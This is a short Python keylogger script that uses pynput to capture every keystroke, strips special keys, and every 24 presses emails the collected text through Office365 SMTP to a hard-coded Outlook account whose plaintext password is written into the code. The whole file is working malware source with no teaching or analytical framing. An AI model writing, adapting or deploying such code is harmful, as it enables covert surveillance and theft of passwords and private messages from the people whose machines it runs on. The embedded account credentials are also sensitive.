from pynput.keyboard import Key, Listener
import smtplib

count = 0
keys = []


def send_email(msg):
    global server
    smtp_server = 'smtp.office365.com'
    port = 587
    sender_email = 'keyloggerpy33@outlook.fr'
    rec_email = sender_email
    password = 'Lp06040604'

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(sender_email, password)
        hdr = ("From: %s\r\nTo: %s\r\n\r\n"
               % (sender_email, rec_email))
        server.sendmail(sender_email, rec_email, hdr + msg)

    except Exception as e:
        print(e)

    finally:
        server.quit()

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 23:
        count = 0
        email(keys)


def email(keys):
    msg = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        msg += k
    send_email(msg)


def on_release(key):
    if key == Key.f7:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

